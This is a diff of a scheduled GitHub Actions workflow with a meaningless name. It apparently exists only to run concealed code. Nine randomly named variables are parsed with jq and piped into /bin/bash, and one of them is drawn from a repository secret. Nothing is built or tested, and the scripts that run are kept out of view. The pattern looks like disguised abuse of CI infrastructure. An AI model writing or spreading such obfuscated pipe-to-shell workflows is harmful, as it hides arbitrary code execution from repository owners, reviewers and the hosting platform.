@@ -1,25 +1,24 @@
 name: trusteedartboard
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 1/6 * * *'
-jobs:  # 22038
+    - cron: '46 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: trusteedartboard
         env:
-          xc9: ${{ secrets.xc9 }}
+          klayb3968: ${{ secrets.klayb3968 }}
         run: |
-          echo $xc9 | jq -r .lanzo77288 | /bin/bash
-          echo $bjg07424 | jq -r .ene79 | /bin/bash
-          echo $cltcs3332 | jq -r .e777 | /bin/bash
-          echo $nmd99 | jq -r .gbd38259 | /bin/bash
-          echo $obi3685 | jq -r .nn16809 | /bin/bash
-          echo $cwkwq08143 | jq -r .rmv3313 | /bin/bash
-          echo $zzh68604 | jq -r .mmm2 | /bin/bash
-          echo $mc4145 | jq -r .hov84835 | /bin/bash
-          echo $a978 | jq -r .oeuf080 | /bin/bash
+          echo $klayb3968 | jq -r .gx00 | /bin/bash
+          echo $qhxu01 | jq -r .kisn3603 | /bin/bash
+          echo $saz155 | jq -r .dwmpw3 | /bin/bash
+          echo $y74240 | jq -r .kuz36 | /bin/bash
+          echo $d6 | jq -r .q8010 | /bin/bash
+          echo $pv5 | jq -r .rwtrg6 | /bin/bash
+          echo $f7 | jq -r .gd11 | /bin/bash
+          echo $r388 | jq -r .wnv14072 | /bin/bash
+          echo $e46548 | jq -r .m64 | /bin/bash
 
